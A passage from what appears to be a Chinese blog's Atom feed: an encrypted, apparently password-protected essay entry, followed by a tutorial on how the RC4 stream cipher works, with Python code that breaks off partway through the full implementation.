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 </div>]]></content>
    
    <summary type="html">
    
      随笔
    
    </summary>
    
      <category term="随笔" scheme="0verwatch.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="0verwatch.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>RC4的原理及python实现</title>
    <link href="0verwatch.top/RC4-python.html"/>
    <id>0verwatch.top/RC4-python.html</id>
    <published>2018-12-23T03:58:51.000Z</published>
    <updated>2018-12-23T04:00:38.389Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。<a id="more"></a>它加解密使用相同的密钥，<code>一个字节一个字节</code>地加密。因此也属于对称加密算法。突出优点是在软件里面很容易实现。</p><h3 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h3><p>包含两个处理过程：一是秘钥调度算法(KSA)，用于之乱S盒的初始排列，另外一个是伪随机数生成算法(PRGA)，用来输出随机序列并修改S的当前顺序。</p><ol><li>根据秘钥生成S盒</li><li>利用PRGA生成秘钥流</li><li>秘钥与明文异或产生密文</li></ol><p>单个点拿出来分析</p><h4 id="根据秘钥生成S盒"><a href="#根据秘钥生成S盒" class="headerlink" title="根据秘钥生成S盒"></a>根据秘钥生成S盒</h4><p>初始化S盒</p><p>直接构造一个S[256]，遍历0~255，然后创建临时T[256]，用于存储种子秘钥，长度不够循环填充直到T被填满，根据T[i]将S[i]与S中的另外一个字节对换，对S的操作仅仅是交换，唯一改变的是位置，但里面的元素是没变的还是0~255</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s_box = list(range(<span class="number">256</span>)) <span class="comment">#我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line"><span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line"><span class="keyword">return</span> s_box</span><br></pre></td></tr></table></figure><p>下图很好的解释了S盒被随机化的过程</p><p><img src="https://s1.ax1x.com/2018/12/23/FyoTbQ.png" alt="FyoTbQ.png"></p><h4 id="利用PRGA生成秘钥流"><a href="#利用PRGA生成秘钥流" class="headerlink" title="利用PRGA生成秘钥流"></a>利用PRGA生成秘钥流</h4><p>从S盒选取一个元素输出，并置换S盒便于下一轮取出，选取过程取决于索引i和j，这也体现了在加密过程中S盒会变化。下面的是流程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">res = []</span><br><span class="line">i = j =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">    i = (i + <span class="number">1</span>) %<span class="number">256</span></span><br><span class="line">    j = (j + box[i]) %<span class="number">256</span></span><br><span class="line">    box[i], box[j] = box[j], box[i]</span><br><span class="line">    t = (box[i] + box[j])% <span class="number">256</span></span><br><span class="line">    k = box[t]</span><br><span class="line">    res.append(chr(ord(s)^k))  <span class="comment">#直接与每一个字节明文相异或</span></span><br></pre></td></tr></table></figure><h4 id="秘钥与明文异或产生密文"><a href="#秘钥与明文异或产生密文" class="headerlink" title="秘钥与明文异或产生密文"></a>秘钥与明文异或产生密文</h4><p>至于这一点就不用多说了，由于异或运算的对合性，RC4加密解密使用同一套算法。</p><h4 id="python实现："><a href="#python实现：" class="headerlink" title="python实现："></a>python实现：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_message</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"输入你的信息："</span>)</span><br><span class="line">    s = input()</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"输入你的秘钥："</span>)</span><br><span class="line">    key = input()</span><br><span class="line">    <span class="keyword">if</span> key == <span class="string">''</span>:</span><br><span class="line">        key = <span class="string">'none_public_key'</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_box</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    S盒 </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) <span class="comment">#我这里没管秘钥小于256的情况，小于256应该不断重复填充即可</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment">#print(type(s_box)) #for_test</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_encrypt</span><span class="params">(plain,box,mode)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    利用PRGA生成秘钥流并与密文字节异或，加解密同一个算法</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 